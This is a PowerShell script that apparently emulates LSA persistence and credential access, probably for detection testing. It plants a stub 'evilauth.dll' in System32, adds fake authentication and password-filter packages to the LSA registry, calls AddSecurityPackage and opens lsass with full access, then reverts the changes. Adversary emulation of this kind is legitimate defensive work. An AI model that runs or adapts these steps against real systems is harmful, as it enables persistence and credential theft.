$lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"

$current = @("msv1_0")
try { $current = (Get-ItemProperty -Path $lsaKey -Name "Authentication Packages" -ErrorAction Stop)."Authentication Packages" } catch {}

$malDll = "$env:SYSTEMROOT\System32\evilauth.dll"
$peStub = [byte[]]@(0x4D, 0x5A) + (New-Object byte[] 2046)
try { [System.IO.File]::WriteAllBytes($malDll, $peStub) } catch {}

try {
    Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value (@($current) + @("evilauth")) -ErrorAction Stop
} catch {}

$notifCurrent = @("scecli")
try { $notifCurrent = (Get-ItemProperty -Path $lsaKey -Name "Notification Packages" -ErrorAction Stop)."Notification Packages" } catch {}
try {
    Set-ItemProperty -Path $lsaKey -Name "Notification Packages" -Value (@($notifCurrent) + @("evilpwfilter")) -ErrorAction Stop
} catch {}

if (-not ('LsaLoader' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class LsaLoader {
        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int AddSecurityPackage(string name, IntPtr opts);
        [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
        public static extern int DeleteSecurityPackage(string name);
    }
'@
}

$r = [LsaLoader]::AddSecurityPackage("evilauth", [IntPtr]::Zero)
if ($r -eq 0) { [LsaLoader]::DeleteSecurityPackage("evilauth") | Out-Null }

if (-not ('LsassOpen' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class LsassOpen {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr h);
    }
'@
}

$lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
if ($lsass) {
    $h = [LsassOpen]::OpenProcess(0x1FFFFF, $false, $lsass.Id)
    if ($h -ne [IntPtr]::Zero) { [LsassOpen]::CloseHandle($h) | Out-Null }
}

try { Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value $current -ErrorAction Stop } catch {}
try { Set-ItemProperty -Path $lsaKey -Name "Notification Packages" -Value $notifCurrent -ErrorAction Stop } catch {}
Remove-Item $malDll -Force -ErrorAction SilentlyContinue
